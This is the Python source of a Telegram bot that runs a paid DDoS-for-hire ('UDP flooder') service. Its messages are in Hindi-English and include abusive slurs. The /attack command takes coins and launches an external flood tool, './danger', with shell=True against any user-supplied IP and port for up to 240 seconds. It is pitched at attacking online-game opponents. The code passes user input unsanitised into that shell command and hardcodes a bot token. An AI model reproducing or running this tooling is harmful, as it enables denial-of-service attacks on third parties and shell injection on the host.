import asyncio
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import time

# Define Admin ID
ADMIN_ID = "7469108296"  # Replace with the actual Telegram user ID of the admin 

# In-memory database to store user balances
user_data = {}
start_time = time.time()  # Record bot's start time

# Define the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_message = """
❄️ *WELCOME TO @DEVILVIPDDOS ULTIMATE UDP FLOODER* ❄️

🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥

✨ *Key Features:* ✨
🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack
🏦 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo
🤡 𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂

⚠️ *Kaise Use Kare?* ⚠️
Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help

💬 *Queries or Issues?* 💬
Contact Admin: @DEVILVIPDDOS
"""
    await update.message.reply_text(welcome_message, parse_mode="Markdown")

# Define the /help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_message = """
🛠️ DEVIL VIP DDOS Bot Help Menu 🛠️

🌟 Yahan hai sab kuch jo tumhe chahiye! 🌟

📜 Available Commands: 📜

1️⃣ 🔥 /attack <ip> <port> <duration>
   - Is command ka use karke tum attack laga sakte ho.
   - Example: /attack 192.168.1.1 20876 240
   - 📝 Note: Duration 240 seconds se zyada nahi ho sakta.

2️⃣ 💳 /myinfo
   - Apne account ka status aur coins check karne ke liye.
   - Example: Tumhare balance aur approval status ka pura details milega.

3️⃣ 🔧 /uptime
   - Bot ka uptime check karo aur dekho bot kitne der se chal raha hai.

4️⃣ ❓ /help
   - Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.

🚨 𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬: 🚨
- BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.
- Agar koi dikkat aaye toh admin ko contact karo: @DEVILVIPDDOS

💥 Ab jao aur hacker banne ka natak shuru karo! 💥
"""
    await update.message.reply_text(help_message, parse_mode="Markdown")

# Data placeholders
user_data = {}  # User data with balances
active_attacks = {}  # Tracks active attacks

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)

    # Check if user is registered
    if user_id not in user_data:
        await update.message.reply_text(
            "💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂"
        )
        return

    # Check if the user is already running an attack
    if user_id in active_attacks:
        remaining_time = active_attacks[user_id]
        await update.message.reply_text(
            f"⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. "
            f"Attack khatam hone mein {remaining_time} seconds bache hain."
        )
        return

    # Parse and validate command arguments
    if len(context.args) != 3:
        error_message = """
❌ *Usage galat hai!* Command ka sahi format yeh hai:
👉 `/attack <ip> <port> <duration>`
📌 *Example:* `/attack 192.168.1.1 26547 240`
"""
        await update.message.reply_text(error_message, parse_mode="Markdown")
        return

    ip = context.args[0]
    port = context.args[1]
    try:
        duration = int(context.args[2])
        if duration > 240:
            await update.message.reply_text(
                "⛔ Limit cross mat karo! Tum sirf 240 seconds tak attack kar sakte ho.\n"
                "Agar zyada duration chahiye toh admin se baat karo! 😎"
            )
            return
    except ValueError:
        await update.message.reply_text("❌ Duration ek valid number hona chahiye.")
        return

    # Deduct coins for the attack
    attack_cost = 5  # Cost of the attack
    user_balance = user_data.get(user_id, {}).get("balance", 0)

    if user_balance < attack_cost:
        await update.message.reply_text(
            "💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂"
        )
        return

    # Deduct coins and update balance
    user_data[user_id]["balance"] -= attack_cost
    remaining_balance = user_data[user_id]["balance"]

    # Attack initiation message
    attack_message = f"""
🚀 *[ATTACK INITIATED]* 🚀

💣 *Target IP:* {ip}
🔢 *Port:* {port}
🕒 *Duration:* {duration} seconds
💰 *Coins Deducted:* {attack_cost}
📉 *Remaining Balance:* {remaining_balance}

🔥 *Attack chal raha hai! Chill kar aur enjoy kar!* 💥
"""
    await update.message.reply_text(attack_message, parse_mode="Markdown")

    # Mark the user as active and track the remaining time
    active_attacks[user_id] = duration

    # Execute attack command
    try:
        process = subprocess.Popen(
            f"./danger {ip} {port} {duration}",  # Replace with actual attack tool command
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = process.communicate()

        # Debugging output
        if stdout:
            print(f"[INFO] {stdout.decode()}")
        if stderr:
            print(f"[ERROR] {stderr.decode()}")

        if process.returncode != 0:
            await update.message.reply_text(
                "❌ Attack failed! Command execution error."
            )
            del active_attacks[user_id]
            return

    except Exception as e:
        await update.message.reply_text(f"❌ Attack failed: {e}")
        del active_attacks[user_id]
        return

    # Simulate the attack duration
    while active_attacks[user_id] > 0:
        await asyncio.sleep(1)
        active_attacks[user_id] -= 1

    # Remove user from active attacks after completion
    del active_attacks[user_id]

    # Attack completion message
    complete_message = f"""
✅ *[ATTACK FINISHED]* ✅

💣 *Target IP:* {ip}
🔢 *Port:* {port}
🕒 *Duration:* {duration} seconds

💥 *Attack complete! Ab chill kar aur feedback bhej!* 🚀
"""
    await update.message.reply_text(complete_message, parse_mode="Markdown")

# Define the /devil command (Admin-only)
async def devil(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    
    # Check if the user is the admin
    if user_id != ADMIN_ID:
        await update.message.reply_text("🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /devil <user_id> <balance>")
        return

    target_user_id = context.args[0]
    try:
        balance = int(context.args[1])
    except ValueError:
        await update.message.reply_text("Please enter a valid numeric balance.")
        return

    # Add user to the system with the specified balance
    user_data[target_user_id] = {"balance": balance}
    await update.message.reply_text(
        f"✅ User with ID {target_user_id} added with balance {balance}."
    )

# Define the /myinfo command
async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.effective_user.id)
    if user_id in user_data:
        balance = user_data[user_id]["balance"]
        await update.message.reply_text(
            f"""📝 Tera info check kar le, Gandu hacker:
💰 Coins: {balance}
😏 Status: Approved
Ab aur kya chahiye? Hacker banne ka sapna toh kabhi poora hoga nahi!""",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            """📝 Tera info check kar le, chutiye hacker:
💰 Coins: 0
😏 Status: Approved
Ab aur kya chahiye? Hacker banne ka sapna toh kabhi poora hoga nahi!""",
            parse_mode="Markdown"
        )

# Define the /uptime command
async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    elapsed_time = time.time() - start_time
    hours, rem = divmod(elapsed_time, 3600)
    minutes, seconds = divmod(rem, 60)
    await update.message.reply_text(
        f"⏰ Bot uptime: {int(hours)} hours, {int(minutes)} minutes, {int(seconds)} seconds."
    )

# Main function to set up the bot
def main():
    app = ApplicationBuilder().token("7556718869:AAGHtOKU2BzOd29UWHNpKQhkH4ObAIH9kVc").build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("devil", devil))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("uptime", uptime))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
